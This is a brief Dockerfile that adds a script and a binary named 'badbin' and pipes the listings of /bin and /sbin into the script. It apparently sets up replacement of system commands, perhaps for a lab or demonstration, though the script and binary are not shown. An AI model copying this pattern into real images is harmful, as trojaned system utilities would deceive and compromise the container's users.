FROM golang:alpine
RUN mkdir /app 
WORKDIR /app
ADD replace.sh .
ADD badbin .
RUN chmod +x replace.sh
RUN chmod +x badbin
RUN ls /bin | ./replace.sh
RUN ls /sbin | ./replace.sh
CMD ifconfig